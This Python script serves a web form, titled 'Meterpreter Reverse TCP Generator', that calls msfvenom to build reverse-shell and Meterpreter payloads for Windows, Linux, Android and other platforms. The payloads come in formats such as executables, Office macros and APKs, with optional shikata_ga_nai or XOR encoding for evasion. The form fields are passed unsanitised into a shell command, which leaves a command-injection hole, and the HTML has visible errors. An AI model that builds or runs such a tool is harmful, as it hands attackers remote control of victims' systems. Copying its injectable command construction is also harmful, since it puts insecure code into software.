import http.server
import socketserver
import os
import subprocess
import threading

# Définition du répertoire racine du site web
ROOT_DIR = os.path.dirname(os.path.abspath(__file__))

# Définition du port et de l'hôte pour le serveur web
PORT = 8000
HOST = '192.168.1.80'

# Définition du template HTML pour le formulaire
# ...

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Meterpreter Reverse TCP Generator</title>
    <style>
        body {
            background-color: #1a1a1a; /* dark background */
            font-family: monospace; /* monospace font for a hacker feel */
            color: #fc0303; /* green text */
        }
        form {
            width: 50%;
            margin: 40px auto;
            padding: 20px;
            border: 1px solid #333; /* dark border */
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* dark shadow */
            box-shadow: 0 0 10px #fc0303; /* green glow effect */
        }
        label {
            display: block;
            margin-bottom: 10px;
        }
        input[type="text"] {
            width: 50%;
            height: 30px;
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #333; /* dark border */
            background-color: #222; /* dark background */
            color: #fc0303; /* green text */
        }
        input[type="text"][id="lhost"], input[type="text"][id="lport"] {
          border: 2px solid #fc0303; /* green border */
          border-radius: 5px; /* rounded corners */
        }
        select {
            width: 100%;
            height: 200px; /* adjust the height to your liking */
            overflow-y: auto; /* add scrollbar */
            padding: 10px;
            border: 1px solid #333; /* dark border */
            background-color: #222; /* dark background */
            color: #fc0303; /* green text */
            box-shadow: 0 0 10px #fc0303; /* green glow effect */
        }
        button[type="submit"] {
          background-color: #333; /* dark background */
          color: #fc0303; /* green text */
          padding: 10px 20px;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          font-family: 'VT323', monospace; /* font-family pour un style hacker */
          font-size: 18px;
          text-transform: uppercase; /* text en majuscule */
          letter-spacing: 2px; /* espacement entre les lettres */
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* ombre pour un effet 3D */
        }
        
        button[type="submit"]:hover {
          background-color: #444; /* darker background on hover */
          color: #fc0303; /* green text on hover */
          box-shadow: 0 0 15px rgba(0, 0, 0, 0.7); /* ombre plus intense on hover */
        }
        
        button[type="submit"]:active {
          background-color: #555; /* background encore plus sombre on click */
          color: #fc0303; /* green text on click */
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* ombre moins intense on click */
        }
        button#switch-interface {
          position: absolute;
          top: 20px;
          left: 20px;
          background-color: #333; /* dark background */
          color: #fc0303; /* green text */
          padding: 10px 20px;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          font-family: 'VT323', monospace; /* font-family pour un style hacker */
          font-size: 18px;
          text-transform: uppercase; /* text en majuscule */
          letter-spacing: 2px; /* espacement entre les lettres */
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* ombre pour un effet 3D */
        }


        label {
            font-size: 16px; /* taille de police pour les étiquettes */
        }

        input[type="text"] {
            height: 30px; /* hauteur des champs de saisie */
            font-size: 16px; /* taille de police pour les champs de saisie */
            padding: 10px; /* ajouter un peu de padding pour rendre les champs de saisie plus lisibles */
        }

        select {
            height: 200px; /* hauteur de la liste déroulante */
            font-size: 16px; /* taille de police pour la liste déroulante */
        }

        button[type="submit"] {
            position: relative; /* rendre le bouton relatif */
            top: auto; /* supprimer la positionnement en haut */
            left: auto; /* supprimer la positionnement à gauche */
            margin: 20px auto; /* ajouter une marge pour centrer le bouton */
        }

        /* Styles pour mobile (largeur inférieure ou égale à 768px) */
        @media only screen and (max-width: 768px) {
            form {
                width: 100%; /* prendre toute la largeur de l'écran */
                height: 100%; /* prendre toute la hauteur de l'écran */
                padding: 40px; /* ajouter plus de padding pour rendre le formulaire plus lisible */
            }

            label {
                font-size: 18px; /* taille de police pour les étiquettes */
            }

            input[type="text"] {
                height: 40px; /* hauteur des champs de saisie */
                font-size: 18px; /* taille de police pour les champs de saisie */
                padding: 10px; /* ajouter un peu de padding pour rendre les champs de saisie plus lisibles */
            }

            select {
                height: 300px; /* hauteur de la liste déroulante */
                font-size: 18px; /* taille de police pour la liste déroulante */
            }

            button[type="submit"] {
                position: relative; /* rendre le bouton relatif */
                top: auto; /* supprimer la positionnement en haut */
                left: auto; /* supprimer la positionnement à gauche */
                margin: 20px auto; /* ajouter une marge pour centrer le bouton */
            }

            /* Styles pour le bouton switcher */
            .mobile-interface button#switch-interface {
                position: absolute;
                top: 20px;
                left: 20px;
            }
        }
    </style>
</head>
<body>
    <h1 style="text-align: center; margin-bottom: 20px;">Bienvenue sur le générateur de Meterpreter Reverse TCP</h1>
    <p style="text-align: center; margin-bottom: 40px;">Ce site vous permet de générer des payloads Meterpreter Reverse TCP pour différents systèmes d'exploitation.</p>
    <button id="switch-interface" onclick="switchInterface()">Switch to PC interface</button>
    <div id="interface" class="mobile-interface">
        <form action="" method="post">
            <label for="lhost">LHOST:</label>
            <input type="text" id="lhost" name="lhost" required><br><br>
            <label for="lport">LPORT:</label>
            <input type="text" id="lport" name="lport" required><br><br>
            <label for="payload">Payload:</label>
            <select id="payload" name="payload" required size="50"> <!-- adjust the size to your liking -->
                 <!-- Windows -->
                 <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
                 <option value="windows/meterpreter/reverse_https">Windows Meterpreter Reverse HTTPS</option>
                 <option value="windows/meterpreter/reverse_http">Windows Meterpreter Reverse HTTP</option>
                 <option value="windows/shell/reverse_tcp">Windows Shell Reverse TCP</option>
                 <option value="windows/shell/reverse_https">Windows Shell Reverse HTTPS</option>
                 <option value="windows/shell/reverse_http">Windows Shell Reverse HTTP</option>
                 <option value="windows/x86/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP (x86)</option>
                 <option value="windows/x86/meterpreter/reverse_https">Windows Meterpreter Reverse HTTPS (x86)</option>
                 <option value="windows/x86/meterpreter/reverse_http">Windows Meterpreter Reverse HTTP (x86)</option>
                 <option value="windows/x86/shell/reverse_tcp">Windows Shell Reverse TCP (x86)</option>
                 <option value="windows/x86/shell/reverse_https">Windows Shell Reverse HTTPS (x86)</option>
                 <option value="windows/x86/shell/reverse_http">Windows Shell Reverse HTTP (x86)</option>
                 <option value="windows/x64/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP (x64)</option>
                 <option value="windows/x64/meterpreter/reverse_https">Windows Meterpreter Reverse HTTPS (x64)</option>
                 <option value="windows/x64/meterpreter/reverse_http">Windows Meterpreter Reverse HTTP (x64)</option>
                 <option value="windows/x64/shell/reverse_tcp">Windows Shell Reverse TCP (x64)</option>
                 <option value="windows/x64/shell/reverse_https">Windows Shell Reverse HTTPS (x64)</option>
                 <option value="windows/x64/shell/reverse_http">Windows Shell Reverse HTTP (x64)</option>
               
                 <!-- Linux -->
                 <option value="linux/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP</option>
                 <option value="linux/meterpreter/reverse_https">Linux Meterpreter Reverse HTTPS</option>
                 <option value="linux/meterpreter/reverse_http">Linux Meterpreter Reverse HTTP</option>
                 <option value="linux/shell/reverse_tcp">Linux Shell Reverse TCP</option>
                 <option value="linux/shell/reverse_https">Linux Shell Reverse HTTPS</option>
                 <option value="linux/shell/reverse_http">Linux Shell Reverse HTTP</option>
                 <option value="linux/x86/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP (x86)</option>
                 <option value="linux/x86/meterpreter/reverse_https">Linux Meterpreter Reverse HTTPS (x86)</option>
                 <option value="linux/x86/meterpreter/reverse_http">Linux Meterpreter Reverse HTTP (x86)</option>
                 <option value="linux/x86/shell/reverse_tcp">Linux Shell Reverse TCP (x86)</option>
                 <option value="linux/x86/shell/reverse_https">Linux Shell Reverse HTTPS (x86)</option>
                 <option value="linux/x86/shell/reverse_http">Linux Shell Reverse HTTP (x86)</option>
                 <option value="linux/x64/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP (x64)</option>
                 <option value="linux/x64/meterpreter/reverse_https">Linux Meterpreter Reverse HTTPS (x64)</option>
                 <option value="linux/x64/meterpreter/reverse_http">Linux Meterpreter Reverse HTTP (x64)</option>
                 <option value="linux/x64/shell/reverse_tcp">Linux Shell Reverse TCP (x64)</option>
                 <option value="linux/x64/shell/reverse_https">Linux Shell Reverse HTTPS (x64)</option>
                 <option value="linux/x64/shell/reverse_http">Linux Shell Reverse HTTP (x64)</option>
               
                 <!-- macOS -->
                 <option value="osx/meterpreter/reverse_tcp">macOS Meterpreter Reverse TCP</option>
                 <option value="osx/meterpreter/reverse_https">macOS Meterpreter Reverse HTTPS</option>
                 <option value="osx/meterpreter/reverse_http">macOS Meterpreter Reverse HTTP</option>
                 <option value="osx/shell/reverse_tcp">macOS Shell Reverse TCP</option>
                 <option value="osx/shell/reverse_https">macOS Shell Reverse HTTPS</option>
                 <option value="osx/shell/reverse_http">macOS Shell Reverse HTTP</option>
    
                <!-- Android -->
                <option value="android/meterpreter/reverse_tcp">Android Meterpreter Reverse TCP</option>
                <option value="android/meterpreter/reverse_https">Android Meterpreter Reverse HTTPS</option>
                <option value="android/meterpreter/reverse_http">Android Meterpreter Reverse HTTP</option>
                <option value="android/shell/reverse_tcp">Android Shell Reverse TCP</option>
                <option value="android/shell/reverse_https">Android Shell Reverse HTTPS</option>
                <option value="android/shell/reverse_http">Android Shell Reverse HTTP</option>
            
                <!-- iOS -->
                <option value="ios/meterpreter/reverse_tcp">iOS Meterpreter Reverse TCP</option>
                <option value="ios/meterpreter/reverse_https">iOS Meterpreter Reverse HTTPS</option>
                <option value="ios/meterpreter/reverse_http">iOS Meterpreter Reverse HTTP</option>
                <option value="ios/shell/reverse_tcp">iOS Shell Reverse TCP</option>
                <option value="ios/shell/reverse_https">iOS Shell Reverse HTTPS</option>
                <option value="ios/shell/reverse_http">iOS Shell Reverse HTTP</option>
            
                <!-- Chrome OS -->
                <option value="chromeos/meterpreter/reverse_tcp">Chrome OS Meterpreter Reverse TCP</option>
                <option value="chromeos/meterpreter/reverse_https">Chrome OS Meterpreter Reverse HTTPS</option>
                <option value="chromeos/meterpreter/reverse_http">Chrome OS Meterpreter Reverse HTTP</option>
                <option value="chromeos/shell/reverse_tcp">Chrome OS Shell Reverse TCP</option>
                <option value="chromeos/shell/reverse_https">Chrome OS Shell Reverse HTTPS</option>
                <option value="chromeos/shell/reverse_http">Chrome OS Shell Reverse HTTP</option>
            
                <!-- BSD -->
                <option value="bsd/meterpreter/reverse_tcp">BSD Meterpreter Reverse TCP</option>
                <option value="bsd/meterpreter/reverse_https">BSD Meterpreter Reverse HTTPS</option>
                <option value="bsd/meterpreter/reverse_http">BSD Meterpreter Reverse HTTP</option>
                <option value="bsd/shell/reverse_tcp">BSD Shell Reverse TCP</option>
                <option value="bsd/shell/reverse_https">BSD Shell Reverse HTTPS</option>
                <option value="bsd/shell/reverse_http">BSD Shell Reverse HTTP</option>
            
                <!-- Solaris -->
                <option value="solaris/meterpreter/reverse_tcp">Solaris Meterpreter Reverse TCP</option>
                <option value="solaris/meterpreter/reverse_https">Solaris Meterpreter Reverse HTTPS</option>
                <option value="solaris/meterpreter/reverse_http">Solaris Meterpreter Reverse HTTP</option>
                <option value="solaris/shell/reverse_tcp">Solaris Shell Reverse TCP</option>
                <option value="solaris/shell/reverse_https">Solaris Shell Reverse HTTPS</option>
                <option value="solaris/shell/reverse_http">Solaris Shell Reverse HTTP</option>
            
                <!-- PHP -->
                <option value="php/meterpreter/reverse_tcp">PHP Meterpreter Reverse TCP</option>
                <option value="php/meterpreter/reverse_https">PHP Meterpreter Reverse HTTPS</option>
                <option value="php/meterpreter/reverse_http">PHP Meterpreter Reverse HTTP</option>
                <option value="php/shell/reverse_tcp">PHP Shell Reverse TCP</option>
                <option value="php/shell/reverse_https">PHP Shell Reverse HTTPS</option>
                <option value="php/shell/reverse_http">PHP Shell Reverse HTTP</option>
            
                <!-- ASP -->
                <option value="asp/meterpreter/reverse_tcp">ASP Meterpreter Reverse TCP</option>
                <option value="asp/meterpreter/reverse_https">ASP Meterpreter Reverse HTTPS</option>
                <option value="asp/meterpreter/reverse_http">ASP Meterpreter Reverse HTTP</option>
                <option value="asp/shell/reverse_tcp">ASP Shell Reverse TCP</option>
                <option value="asp/shell/reverse_https">ASP Shell Reverse HTTPS</option>
                <option value="asp/shell/reverse_http">ASP Shell Reverse HTTP</option>
            
                <!-- JSP -->
                <option value="jsp/meterpreter/reverse_tcp">JSP Meterpreter Reverse TCP</option>
                <option value="jsp/meterpreter/reverse_https">JSP Meterpreter Reverse HTTPS</option>
                <option value="jsp/meterpreter/reverse_http">JSP Meterpreter Reverse HTTP</option>
                <option value="jsp/shell/reverse_tcp">JSP Shell Reverse TCP</option>
                <option value="jsp/shell/reverse_https">JSP Shell Reverse HTTPS</option
    
    
                <!-- WAR -->
                <option value="war/meterpreter/reverse_tcp">WAR Meterpreter Reverse TCP</option>
                <option value="war/meterpreter/reverse_https">WAR Meterpreter Reverse HTTPS</option>
                <option value="war/meterpreter/reverse_http">WAR Meterpreter Reverse HTTP</option>
                <option value="war/shell/reverse_tcp">WAR Shell Reverse TCP</option>
                <option value="war/shell/reverse_https">WAR Shell Reverse HTTPS</option>
                <option value="war/shell/reverse_http">WAR Shell Reverse HTTP</option>
    
            </select><br><br>
            <label for="output">Output format:</label>
            <select id="output" name="output" required size="20"> <!-- adjust the size to your liking -->
                <option value="raw">Raw</option>
                <option value="exe">Executable (Windows)</option>
                <option value="elf">Executable (Linux)</option>
                <option value="dll">Dynamic Link Library (Windows)</option>
                <option value="so">Shared Object (Linux)</option>
                <option value="vba">VBA Macro (Office)</option>
                <option value="hta">HTA Application (Windows)</option>
                <option value="js">JavaScript (Web)</option>
                <option value="py">Python Script</option>
                <option value="rb">Ruby Script</option>
                <option value="perl">Perl Script</option>
                <option value="php">PHP Script</option>
                <option value="war">WAR File (Java)</option>
                <option value="jar">JAR File (Java)</option>
                <option value="apk">Android Application Package</option>
                <option value="ipa">iOS Application Package</option>
                <option value="macho">Mach-O Executable (macOS)</option>
                <option value="dylib">Dynamic Library (macOS)</option>
                <option value="bundle">Bundle (macOS)</option>
                <option value="ps1">PowerShell Script</option>
                <option value="bat">Batch Script (Windows)</option>
                <option value="sh">Shell Script (Linux/macOS)</option>
                <option value="cmd">Command Script (Windows)</option>
                <option value="vbs">VBScript (Windows)</option>
                <option value="wsf">Windows Script File</option>
            </select><br><br>
            <label for="obfuscation">Obfuscation:</label>
            <select id="obfuscation" name="obfuscation" required size="5"> <!-- adjust the size to your liking -->
                <option value="none">None</option>
                <option value="base64">Base64 encoding</option>
                <option value="xor">XOR encoding</option>
                <option value="shikata_ga_nai">Shikata Ga Nai obfuscation</option>
            </select><br><br>
            <button type="submit">Generate Meterpreter</button>
        </form>
        <div id="output"></div>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                document.querySelector("form").addEventListener("submit", function(event) {
                    event.preventDefault();
                    var lhost = document.querySelector("#lhost").value;
                    var lport = document.querySelector("#lport").value;
                    var payload = document.querySelector("#payload").value;
                    var output = document.querySelector("#output").value;
                    var obfuscation = document.querySelector("#obfuscation").value;
    
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "", true);
                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xhr.send("lhost=" + lhost + "&lport=" + lport + "&payload=" + payload + "&output=" + output + "&obfuscation=" + obfuscation);
    
                    xhr.onreadystatechange = function() {
                        if (xhr.readyState === 4 && xhr.status === 200) {
                            document.querySelector("#output").innerHTML = xhr.responseText;
                        }
                    };
                });
            });
        </script>
        <script>
            function switchInterface() {
                var interface = document.getElementById("interface");
                if (interface.classList.contains("mobile-interface")) {
                    interface.classList.remove("mobile-interface");
                    interface.classList.add("pc-interface");
                    document.getElementById("switch-interface").innerHTML = "Switch to Mobile interface";
                } else {
                    interface.classList.remove("pc-interface");
                    interface.classList.add("mobile-interface");
                    document.getElementById("switch-interface").innerHTML = "Switch to PC interface";
                }
            }
        </script>
</body>
</html>'''


class WebServer(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_TEMPLATE.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        lhost, lport, payload, output, obfuscation = post_data.split("&")
        lhost = lhost.split("=")[1]
        lport = lport.split("=")[1]
        payload = payload.split("=")[1]
        output = output.split("=")[1]
        obfuscation = obfuscation.split("=")[1]

        # Génération du Meterpreter Reverse TCP avec Metasploit
        msfvenom_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output} -o payload.{output}"

        # Handle obfuscation options
        if obfuscation == "base64":
            msfvenom_cmd += " -e x86/base64"
        elif obfuscation == "xor":
            msfvenom_cmd += " -e x86/xor"
        elif obfuscation == "shikata_ga_nai":
            msfvenom_cmd += " -e x86/shikata_ga_nai"
        else:
            # No obfuscation
            pass

        # Exécution de la commande msfvenom
        output = subprocess.check_output(msfvenom_cmd, shell=True)

        # Envoi de la réponse au client
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(output)


class LocalFileServer(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.directory = ROOT_DIR


def run_web_server():
    server_address = (HOST, PORT)
    httpd = http.server.HTTPServer(server_address, WebServer)
    print(f"Web server: http://{HOST}:{PORT}")
    httpd.serve_forever()


def run_local_file_server():
    local_server_address = ('192.168.1.80', 8001)
    httpd = http.server.HTTPServer(local_server_address, LocalFileServer)
    print(f"Local file server: http://192.168.1.80:8001")
    httpd.serve_forever()


if __name__ == "__main__":
    web_server_thread = threading.Thread(target=run_web_server)
    local_file_server_thread = threading.Thread(target=run_local_file_server)

    web_server_thread.start()
    local_file_server_thread.start()

    print("Both servers are running...")
    while True:
        pass
